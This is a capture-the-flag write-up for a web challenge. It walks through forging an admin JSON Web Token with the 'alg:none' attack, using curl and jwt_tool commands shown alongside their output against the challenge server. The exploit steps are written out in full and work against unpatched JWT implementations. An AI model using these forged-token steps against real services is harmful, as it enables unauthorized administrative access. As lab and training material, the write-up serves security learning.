## TheAdmin [100pt]

**Category:** Web
**Solves:** 120

## Description
The Professor has left a vulnerable authentication system. Can you exploit it and gain admin not just using admin? Sometimes the simplest loopholes can lead to the biggest breakthroughs. Its simple but none of you could figure out. Author: TheProfessor https://questcon-theadmin.chals.io

## Solution
We are provided with a API Documentation like this:

```

API Documentation

Welcome to the Challenge API documentation. Below are the details of the endpoints and how to use them.
Endpoints
1. Authenticate - POST /auth

Use this endpoint to authenticate with the username provided in the request body.
Request

POST /auth
Content-Type: application/json

{
  "username": "your_username"
}

Response

{
  "token": "your_token"
}

2. Access User Page - GET /access

Use this endpoint to access a user-authenticated page. You must provide a valid token in the Authorization header.
Request

GET /access
Authorization: Bearer your_token

Response

  Hello, {your special username}

```

Let's get a token for admin:
```bash
$ curl -X POST "https://questcon-theadmin.chals.io/auth" --data '{"username": "admin"}' -H "Content-Type: application/json"
{'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzI5NTk4MTczfQ.jyefZoIr3DCOeNaDynIKst8_7mdakp_KWXGJfd0-104'}
```

After fuzzing a little bit, tried none alg attack on jwt and seem to be working:
```bash
$ python ../../../../Tools/jwt_tool/jwt_tool.py "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzI5NTk4MTczfQ.jyefZoIr3DCOeNaDynIKst8_7mdakp_KWXGJfd0-104" -X a

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi      

Original JWT: 

jwttool_aebd6337718e3ec753036a734bc94865 - EXPLOIT: "alg":"none" - this is an exploit targeting the debug feature ......(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzI5NTk4MTczfQ.
```

And send to get the flag:
```bash
$ curl "https://questcon-theadmin.chals.io/access" -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzI5NTk4MTczfQ." -v
```